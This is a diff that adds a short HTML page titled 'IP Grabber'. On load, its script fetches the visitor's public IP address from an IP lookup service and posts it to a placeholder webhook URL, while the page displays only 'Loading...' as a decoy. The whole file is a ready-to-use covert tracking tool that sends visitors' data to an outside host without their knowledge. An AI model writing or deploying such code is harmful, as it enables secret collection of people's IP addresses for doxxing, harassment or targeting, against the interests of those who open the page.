@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>IP Grabber</title>
+    <script>
+        // Send IP to webhook when page loads
+        window.onload = () => {
+            fetch('https://api.ipify.org?format=json')
+                .then(res => res.json())
+                .then(data => {
+                    fetch('YOUR_WEBHOOK_URL', {
+                        method: 'POST',
+                        body: JSON.stringify(data),
+                        headers: {'Content-Type': 'application/json'}
+                    });
+                });
+        };
+    </script>
+</head>
+<body>Loading...</body>
+</html>
